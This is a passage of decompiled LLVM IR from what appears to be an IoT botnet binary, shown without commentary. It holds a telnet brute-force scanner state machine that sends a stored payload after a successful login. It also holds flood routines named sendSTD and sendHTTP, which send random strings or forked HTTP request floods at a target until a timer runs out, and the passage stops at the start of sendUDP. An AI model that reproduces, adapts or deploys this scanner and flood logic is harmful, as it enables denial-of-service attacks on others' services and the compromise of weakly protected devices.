  %v3_bfe4 = call i32 @advance_state(i32* nonnull %v1_beb0, i32 6)
  br label %dec_label_pc_c460

dec_label_pc_bfec:                                ; preds = %dec_label_pc_b340
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_c004 = inttoptr i32 %v2_b2f4 to i32*
  %v2_c004 = load i32, i32* %v1_c004, align 4
  store i32 %v2_c004, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_c024 = add i32 %v2_b2f0, %v2_bae0
  store i32 %v2_c024, i32* %r3.global-to-local, align 4
  %v1_c028 = inttoptr i32 %v2_c024 to i32*
  %v2_c028 = load i32, i32* %v1_c028, align 4
  store i32 %v2_c028, i32* %r2.global-to-local, align 4
  %v1_c030 = load i32, i32* @sp, align 4
  %v2_c030 = inttoptr i32 %v1_c030 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_23178.113 to i32), i32* %v2_c030, align 4
  %v0_c034 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_c040 = inttoptr i32 %v2_c028 to i8*
  %v5_c040 = call i32 @read_until_response(i32 %v0_c034, i32 %arg1, i8* %v4_c040, i32 1024)
  store i32 %v5_c040, i32* %r3.global-to-local, align 4
  %v2_c048 = icmp eq i32 %v5_c040, 0
  br i1 %v2_c048, label %dec_label_pc_c290, label %dec_label_pc_c050

dec_label_pc_c050:                                ; preds = %dec_label_pc_bfec
  store i32 %storemerge553, i32* @r4, align 4
  %v2_c058 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c06c = load i32, i32* @r4, align 4
  %v2_c078 = mul i32 %v0_c06c, 28
  %v2_c080 = add i32 %v2_ba64, %v2_c078
  %v2_c084 = inttoptr i32 %v2_c080 to i32*
  store i32 %v2_c058, i32* %v2_c084, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_c024, i32* %r3.global-to-local, align 4
  %v2_c0a8 = load i32, i32* %v1_c028, align 4
  store i32 %v2_c0a8, i32* %r3.global-to-local, align 4
  %v1_c0b0 = call i32 @contains_fail(i32 %v2_c0a8)
  store i32 %v1_c0b0, i32* %r3.global-to-local, align 4
  %v2_c0b8 = icmp eq i32 %v1_c0b0, 0
  br i1 %v2_c0b8, label %dec_label_pc_c0e8, label %dec_label_pc_c0c0

dec_label_pc_c0c0:                                ; preds = %dec_label_pc_c050
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c0e0 = call i32 @advance_state(i32* %v1_c004, i32 0)
  br label %dec_label_pc_c460

dec_label_pc_c0e8:                                ; preds = %dec_label_pc_c050
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_c024, i32* %r3.global-to-local, align 4
  %v2_c108 = load i32, i32* %v1_c028, align 4
  store i32 %v2_c108, i32* %r3.global-to-local, align 4
  %v1_c110 = call i32 @contains_success(i32 %v2_c108)
  store i32 %v1_c110, i32* %r3.global-to-local, align 4
  %v2_c118 = icmp eq i32 %v1_c110, 0
  br i1 %v2_c118, label %dec_label_pc_c240, label %dec_label_pc_c120

dec_label_pc_c120:                                ; preds = %dec_label_pc_c0e8
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_c13c = add i32 %v2_b2f4, 8
  store i32 %v2_c13c, i32* %r3.global-to-local, align 4
  %v1_c140 = add i32 %v2_b2f4, 9
  %v2_c140 = inttoptr i32 %v1_c140 to i8*
  %v3_c140 = load i8, i8* %v2_c140, align 1
  %v4_c140 = zext i8 %v3_c140 to i32
  store i32 %v4_c140, i32* %r3.global-to-local, align 4
  %v7_c144 = icmp eq i8 %v3_c140, 2
  br i1 %v7_c144, label %dec_label_pc_c14c, label %dec_label_pc_c174

dec_label_pc_c14c:                                ; preds = %dec_label_pc_c120
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c16c = call i32 @advance_state(i32* %v1_c004, i32 7)
  br label %dec_label_pc_c460

dec_label_pc_c174:                                ; preds = %dec_label_pc_c120
  %v2_c178 = load i32, i32* @global_var_2352c.49, align 4
  store i32 %v2_c178, i32* @r4, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c198 = call i32 @get_telstate_host(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  store i32 %v3_c198, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_c13c, i32* %r3.global-to-local, align 4
  %v1_c1c0 = add i32 %v2_b2f4, 10
  %v2_c1c0 = inttoptr i32 %v1_c1c0 to i8*
  %v3_c1c0 = load i8, i8* %v2_c1c0, align 2
  %v4_c1c0 = zext i8 %v3_c1c0 to i32
  store i32 %v4_c1c0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([18 x i8*]* @global_var_230bc.107 to i32), i32* %r3.global-to-local, align 4
  %v4_c1cc = mul nuw nsw i32 %v4_c1c0, 4
  %v5_c1cc = add i32 %v4_c1cc, ptrtoint ([18 x i8*]* @global_var_230bc.107 to i32)
  %v6_c1cc = inttoptr i32 %v5_c1cc to i32*
  %v7_c1cc = load i32, i32* %v6_c1cc, align 4
  store i32 %v7_c1cc, i32* @lr, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_c13c, i32* %r3.global-to-local, align 4
  %v1_c1f0 = add i32 %v2_b2f4, 11
  %v2_c1f0 = inttoptr i32 %v1_c1f0 to i8*
  %v3_c1f0 = load i8, i8* %v2_c1f0, align 1
  %v4_c1f0 = zext i8 %v3_c1f0 to i32
  store i32 %v4_c1f0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8*]* @global_var_230e0.111 to i32), i32* %r3.global-to-local, align 4
  %v4_c1fc = mul nuw nsw i32 %v4_c1f0, 4
  %v5_c1fc = add i32 %v4_c1fc, ptrtoint ([9 x i8*]* @global_var_230e0.111 to i32)
  %v6_c1fc = inttoptr i32 %v5_c1fc to i32*
  %v7_c1fc = load i32, i32* %v6_c1fc, align 4
  %v1_c200 = load i32, i32* @sp, align 4
  %v2_c200 = inttoptr i32 %v1_c200 to i32*
  store i32 %v7_c1fc, i32* %v2_c200, align 4
  %v0_c204 = load i32, i32* @r4, align 4
  %v0_c20c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_c20c, i32* %r2.global-to-local, align 4
  %v0_c210 = load i32, i32* @lr, align 4
  store i32 %v0_c210, i32* %r3.global-to-local, align 4
  %v4_c214 = call i32 @Rootsprintf(i32 %v0_c204, i32 ptrtoint (i32* @global_var_19484.116 to i32), i32 %v0_c20c, i32 %v0_c210)
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c238 = call i32 @advance_state(i32* %v1_c004, i32 7)
  br label %dec_label_pc_c460

dec_label_pc_c240:                                ; preds = %dec_label_pc_c0e8
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c25c = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_c290:                                ; preds = %dec_label_pc_bfec
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_c2ac = add i32 %v2_b2f0, %v2_ba64
  store i32 %v2_c2ac, i32* %r3.global-to-local, align 4
  %v1_c2b0 = inttoptr i32 %v2_c2ac to i32*
  %v2_c2b0 = load i32, i32* %v1_c2b0, align 4
  store i32 %v2_c2b0, i32* %r3.global-to-local, align 4
  %v1_c2b4 = add i32 %v2_c2b0, 7
  store i32 %v1_c2b4, i32* @r4, align 4
  %v2_c2bc = call i32 @__GI_time(i32* null)
  store i32 %v2_c2bc, i32* %r3.global-to-local, align 4
  %v0_c2c4 = load i32, i32* @r4, align 4
  %v3_c2c4 = icmp ult i32 %v0_c2c4, %v2_c2bc
  br i1 %v3_c2c4, label %dec_label_pc_c2cc, label %dec_label_pc_c460

dec_label_pc_c2cc:                                ; preds = %dec_label_pc_c290
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c2e8 = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_c2f0:                                ; preds = %dec_label_pc_b340
  store i32 %storemerge553, i32* @r4, align 4
  %v2_c2f8 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c30c = load i32, i32* @r4, align 4
  %v2_c318 = mul i32 %v0_c30c, 28
  %v2_c320 = add i32 %v2_ba64, %v2_c318
  %v2_c324 = inttoptr i32 %v2_c320 to i32*
  store i32 %v2_c2f8, i32* %v2_c324, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_c340 = inttoptr i32 %v2_b2f4 to i32*
  %v2_c340 = load i32, i32* %v1_c340, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_c354 = call i32 @__libc_send(i32 %v2_c340, i32* bitcast ([5 x i8]* @global_var_194e4.118 to i32*), i32 4, i32 16384)
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_c370 = load i32, i32* %v1_c340, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_c384 = call i32 @__libc_send(i32 %v2_c370, i32* bitcast ([8 x i8]* @global_var_194ec.120 to i32*), i32 7, i32 16384)
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_c3a0 = load i32, i32* %v1_c340, align 4
  store i32 %v2_c3a0, i32* @r4, align 4
  %v2_c3a8 = load i32, i32* bitcast ([415 x i8]** @global_var_230b8.123 to i32*), align 4
  store i32 %v2_c3a8, i32* @r5, align 4
  store i32 %v2_c3a8, i32* %r3.global-to-local, align 4
  %v1_c3b4 = inttoptr i32 %v2_c3a8 to i8*
  %v3_c3b8 = call i32 @strlen(i8* %v1_c3b4)
  %v0_c3c0 = load i32, i32* @r4, align 4
  %v0_c3c4 = load i32, i32* @r5, align 4
  store i32 %v3_c3b8, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %tmp44 = inttoptr i32 %v0_c3c4 to i32*
  %v6_c3d0 = call i32 @__libc_send(i32 %v0_c3c0, i32* %tmp44, i32 %v3_c3b8, i32 16384)
  store i32 %v6_c3d0, i32* %r3.global-to-local, align 4
  %v1_c3d8 = icmp slt i32 %v6_c3d0, 0
  br i1 %v1_c3d8, label %dec_label_pc_c3e0, label %dec_label_pc_c404

dec_label_pc_c3e0:                                ; preds = %dec_label_pc_c2f0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c3fc = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_c404:                                ; preds = %dec_label_pc_c2f0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_c420 = add i32 %v2_b2f0, %v2_ba64
  store i32 %v2_c420, i32* %r3.global-to-local, align 4
  %v1_c424 = inttoptr i32 %v2_c420 to i32*
  %v2_c424 = load i32, i32* %v1_c424, align 4
  store i32 %v2_c424, i32* %r3.global-to-local, align 4
  %v1_c428 = add i32 %v2_c424, 25
  store i32 %v1_c428, i32* @r4, align 4
  %v2_c430 = call i32 @__GI_time(i32* null)
  store i32 %v2_c430, i32* %r3.global-to-local, align 4
  %v0_c438 = load i32, i32* @r4, align 4
  %v3_c438 = icmp ult i32 %v0_c438, %v2_c430
  br i1 %v3_c438, label %dec_label_pc_c440, label %dec_label_pc_c460

dec_label_pc_c440:                                ; preds = %dec_label_pc_c404
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c45c = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_c460:                                ; preds = %dec_label_pc_ba4c, %dec_label_pc_bb98, %dec_label_pc_be38, %dec_label_pc_c290, %dec_label_pc_c404, %dec_label_pc_b340, %dec_label_pc_b634, %dec_label_pc_c3e0, %dec_label_pc_c2cc, %dec_label_pc_c240, %dec_label_pc_c174, %dec_label_pc_c14c, %dec_label_pc_c0c0, %dec_label_pc_bfc4, %dec_label_pc_bfa0, %dec_label_pc_bf40, %dec_label_pc_be74, %dec_label_pc_be10, %dec_label_pc_bde8, %dec_label_pc_bd24, %dec_label_pc_bd00, %dec_label_pc_bca0, %dec_label_pc_bbd4, %dec_label_pc_bb70, %dec_label_pc_bb48, %dec_label_pc_ba88, %dec_label_pc_ba28, %dec_label_pc_b994, %dec_label_pc_b970, %dec_label_pc_b7c4, %dec_label_pc_b7a0, %dec_label_pc_b608, %dec_label_pc_b5b0, %dec_label_pc_c440
  %v1_c464 = add nuw nsw i32 %storemerge553, 1
  store i32 %v1_c464, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_c478 = icmp slt i32 %v1_c464, %arg2
  br i1 %v5_c478, label %dec_label_pc_b2dc, label %dec_label_pc_b2d0

; uselistorder directives
  uselistorder i32 %v1_c464, { 2, 1, 0 }
  uselistorder i32 %v3_c3b8, { 1, 0 }
  uselistorder i32* %v1_c004, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bf18, { 1, 0 }
  uselistorder i32 %v3_bc78, { 1, 0 }
  uselistorder i32 %v5_b900, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_b488, { 1, 0 }
  uselistorder i32 %v2_b3dc, { 0, 3, 2, 1 }
  uselistorder i32 %v2_b3d8, { 1, 0, 2, 3 }
  uselistorder i8* %v2_b3b0, { 2, 1, 0, 3 }
  uselistorder i32 %v2_b3ac, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i8 %v2_b360, { 1, 0 }
  uselistorder i32 %v0_b324, { 1, 0 }
  uselistorder i32* %v1_b2fc, { 1, 0, 2 }
  uselistorder i32 %v2_b2f8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_b2f4, { 77, 76, 75, 74, 78, 79, 81, 80, 60, 59, 62, 61, 64, 65, 66, 68, 67, 63, 70, 69, 71, 73, 72, 54, 53, 52, 51, 56, 55, 58, 57, 47, 46, 48, 4, 50, 49, 41, 40, 39, 38, 43, 42, 45, 44, 34, 33, 35, 3, 37, 36, 28, 27, 26, 25, 19, 20, 21, 23, 22, 24, 29, 30, 32, 31, 6, 8, 7, 9, 10, 11, 13, 12, 16, 1, 2, 15, 14, 0, 18, 17, 5 }
  uselistorder i32 %v2_b2f0, { 0, 1, 2, 3, 4, 5, 7, 8, 6 }
  uselistorder i32 %v3_b2e8, { 81, 82, 80, 78, 79, 77, 76, 75, 61, 62, 60, 65, 66, 73, 72, 71, 69, 70, 68, 67, 64, 74, 63, 59, 58, 56, 57, 54, 55, 53, 52, 51, 47, 48, 46, 50, 49, 45, 44, 42, 43, 40, 41, 39, 38, 37, 33, 34, 32, 36, 35, 31, 30, 28, 29, 27, 25, 26, 23, 22, 24, 21, 20, 19, 18, 17, 11, 9, 10, 8, 7, 6, 5, 4, 16, 15, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge553, { 1, 4, 5, 6, 7, 10, 9, 8, 3, 2, 0 }
  uselistorder i32 %v2_ba64, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_b7ec, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_b68c, { 1, 0 }
  uselistorder i32 %v1_b2b4, { 1, 2, 0 }
  uselistorder i32 %v1_b290, { 2, 1, 0 }
  uselistorder i32 %storemerge462, { 1, 0 }
  uselistorder i32 %v2_b1b0, { 1, 0 }
  uselistorder i32 %v3_b18c, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 151, 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 16, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 34, 35, 38, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 53, 50, 51, 54, 55, 56, 52, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 74, 71, 72, 75, 76, 77, 73, 80, 78, 79, 81, 84, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 175, 103, 104, 105, 106, 109, 107, 108, 110, 111, 112, 113, 114, 115, 116, 117, 119, 118, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 176, 152, 153, 154, 167, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 177, 168, 169, 170, 172, 171, 174, 173 }
  uselistorder i32* %r2.global-to-local, { 100, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 105, 101, 102, 106, 103, 104 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 ptrtoint ([9 x i8*]* @global_var_230e0.111 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_19480.109 to i32*), { 1, 0 }
  uselistorder i32 ptrtoint ([18 x i8*]* @global_var_230bc.107 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 5, 4, 2, 7, 6, 0, 1, 3, 8, 9 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c460, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_b800, { 1, 0 }
  uselistorder label %dec_label_pc_b7c4, { 1, 0 }
  uselistorder label %dec_label_pc_b340, { 1, 0 }
  uselistorder label %dec_label_pc_b2dc, { 1, 0 }
  uselistorder label %dec_label_pc_b2d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1d4, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_c484 = load i32, i32* @fp, align 4
  store i32 %v3_c484, i32* %stack_var_-16, align 4
  store i32 50316, i32* %stack_var_-4, align 4
  %v13_c484 = ptrtoint i32* %stack_var_-16 to i32
  %v2_c488 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c488, i32* @fp, align 4
  store i32 %arg3, i32* %stack_var_-208, align 4
  %v0_c4a8 = call i32 @socket()
  %v2_c4b8 = call i32 @__GI_time(i32* null)
  %v1_c4cc = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 16, i32* @r2, align 4
  %v2_c4e8 = bitcast i32* %stack_var_-52 to i8*
  %v3_c4e8 = call i32 @__GI_memset(i8* %v2_c4e8, i32 0)
  %v1_c4f0 = add i32 %v1_c4cc, 16
  %v2_c4f0 = inttoptr i32 %v1_c4f0 to i32*
  %v3_c4f0 = load i32, i32* %v2_c4f0, align 4
  %v1_c4f4 = inttoptr i32 %v3_c4f0 to i32*
  %v2_c4f4 = load i32, i32* %v1_c4f4, align 4
  %v2_c4fc = ptrtoint i32* %stack_var_-48 to i32
  %v1_c504 = add i32 %v1_c4cc, 12
  %v2_c504 = inttoptr i32 %v1_c504 to i32*
  %v3_c504 = load i32, i32* %v2_c504, align 4
  store i32 %v3_c504, i32* @r2, align 4
  %v3_c514 = call i32 @bcopy(i32 %v2_c4f4, i32 %v2_c4fc, i32 %v3_c504)
  %v1_c51c = add i32 %v1_c4cc, 8
  %v2_c51c = inttoptr i32 %v1_c51c to i32*
  %v3_c51c = load i32, i32* %v2_c51c, align 4
  %v3_c524 = urem i32 %v3_c51c, 65536
  store i32 %v3_c524, i32* %stack_var_-52, align 4
  %v2_c558 = ptrtoint i32* %stack_var_-196 to i32
  %v3_c5d4 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_c594 = add i32 %v13_c484, -180
  br label %dec_label_pc_c554

dec_label_pc_c554:                                ; preds = %dec_label_pc_c610, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_c614, %dec_label_pc_c610 ]
  store i32 %v2_c558, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_19698.161 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_c56c = call i32 @memcpy()
  %v0_c570 = call i32 @random()
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_c610, label %dec_label_pc_c5b0

dec_label_pc_c5b0:                                ; preds = %dec_label_pc_c554
  %v2_c580 = urem i32 %v0_c570, 36
  %v3_c58c = mul nuw nsw i32 %v2_c580, 4
  %v2_c598 = add i32 %v2_c594, %v3_c58c
  %v1_c59c = inttoptr i32 %v2_c598 to i32*
  %v2_c59c = load i32, i32* %v1_c59c, align 4
  %v5_c5c0 = inttoptr i32 %v2_c59c to i32*
  %v6_c5c0 = call i32 @__libc_send(i32 %v0_c4a8, i32* %v5_c5c0, i32 65, i32 0)
  %v4_c5d4 = call i32 @__libc_connect(i32 %v0_c4a8, %sockaddr* %v3_c5d4, i32 16)
  %v2_c5dc = call i32 @__GI_time(i32* null)
  %v3_c5e8 = load i32, i32* %stack_var_-208, align 4
  %v2_c5ec = add i32 %v3_c5e8, %v2_c4b8
  %v5_c5f4 = icmp slt i32 %v2_c5dc, %v2_c5ec
  br i1 %v5_c5f4, label %dec_label_pc_c608, label %dec_label_pc_c5f8

dec_label_pc_c5f8:                                ; preds = %dec_label_pc_c5b0
  %v1_c5fc = call i32 @__libc_close(i32 %v0_c4a8)
  %v1_c604 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_c608:                                ; preds = %dec_label_pc_c5b0
  br label %dec_label_pc_c610

dec_label_pc_c610:                                ; preds = %dec_label_pc_c554, %dec_label_pc_c608
  %stack_var_-24.0 = phi i32 [ %storemerge3, %dec_label_pc_c554 ], [ 0, %dec_label_pc_c608 ]
  %v1_c614 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_c554

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_c504, { 1, 0 }
  uselistorder i32 %v1_c4cc, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32 65, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_c610, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-545 = alloca i32, align 4
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_c628 = load i32, i32* @fp, align 4
  store i32 50736, i32* %stack_var_-4, align 4
  %v2_c62c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c62c, i32* @fp, align 4
  %v2_c650 = call i32 @__GI_time(i32* null)
  %v2_c65c = add i32 %v2_c650, %arg5
  %v2_c69c = ptrtoint i32* %stack_var_-544 to i32
  %tmp24 = bitcast i32* %stack_var_-544 to i8*
  %v2_c728 = ptrtoint i32* %stack_var_-545 to i32
  %v5_c77c31 = icmp sgt i32 %arg6, 0
  br i1 %v5_c77c31, label %dec_label_pc_c678, label %dec_label_pc_c780

dec_label_pc_c678:                                ; preds = %entry, %dec_label_pc_c764
  %storemerge232 = phi i32 [ %v1_c768, %dec_label_pc_c764 ], [ 0, %entry ]
  %v0_c678 = call i32 @random()
  %v2_c688 = srem i32 %v0_c678, 36
  %v4_c698 = mul nsw i32 %v2_c688, 4
  %v5_c698 = add i32 %v4_c698, ptrtoint ([37 x i8*]* @global_var_23024.200 to i32)
  %v6_c698 = inttoptr i32 %v5_c698 to i32*
  %v7_c698 = load i32, i32* %v6_c698, align 4
  store i32 %v2_c69c, i32* @r0, align 4
  %v7_c6bc = call i32 @sprintf(i32 %v2_c69c, i32 ptrtoint ([64 x i8]* @global_var_19728.202 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v7_c698)
  %v0_c6c0 = call i32 @__libc_fork()
  %v2_c6c8 = icmp eq i32 %v0_c6c0, 0
  br i1 %v2_c6c8, label %dec_label_pc_c764, label %dec_label_pc_c744

dec_label_pc_c6d4:                                ; preds = %dec_label_pc_c744
  %v5_c6ec = call i32 @socket_connect(i32 %arg2, i8 %arg3, i32 %tmp)
  %v2_c6fc = icmp eq i32 %v5_c6ec, 0
  br i1 %v2_c6fc, label %dec_label_pc_c744, label %dec_label_pc_c704

dec_label_pc_c704:                                ; preds = %dec_label_pc_c6d4
  %v3_c70c = call i32 @strlen(i8* %tmp24)
  store i32 %v3_c70c, i32* @r2, align 4
  %v3_c720 = call i32 @__libc_write(i32 %v5_c6ec, i32* nonnull %stack_var_-544)
  store i32 %v2_c728, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_c738 = call i32 @__libc_read(i32 %v5_c6ec)
  %v1_c740 = call i32 @__libc_close(i32 %v5_c6ec)
  br label %dec_label_pc_c744

dec_label_pc_c744:                                ; preds = %dec_label_pc_c6d4, %dec_label_pc_c704, %dec_label_pc_c678
  %v2_c748 = call i32 @__GI_time(i32* null)
  %v5_c758 = icmp slt i32 %v2_c748, %v2_c65c
  br i1 %v5_c758, label %dec_label_pc_c6d4, label %dec_label_pc_c75c

dec_label_pc_c75c:                                ; preds = %dec_label_pc_c744
  %v1_c760 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_c764

dec_label_pc_c764:                                ; preds = %dec_label_pc_c678, %dec_label_pc_c75c
  %v9_c7844 = phi i32 [ 0, %dec_label_pc_c678 ], [ %v1_c760, %dec_label_pc_c75c ]
  %v1_c768 = add nuw nsw i32 %storemerge232, 1
  %v5_c77c = icmp slt i32 %v1_c768, %arg6
  br i1 %v5_c77c, label %dec_label_pc_c678, label %dec_label_pc_c780

dec_label_pc_c780:                                ; preds = %dec_label_pc_c764, %entry
  %v9_c784.lcssa = phi i32 [ %v2_c650, %entry ], [ %v9_c7844, %dec_label_pc_c764 ]
  store i32 %v3_c628, i32* @fp, align 4
  ret i32 %v9_c784.lcssa

; uselistorder directives
  uselistorder i32 %v1_c768, { 1, 0 }
  uselistorder i32 %v2_c650, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_c764, { 1, 0 }
  uselistorder label %dec_label_pc_c744, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c678, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
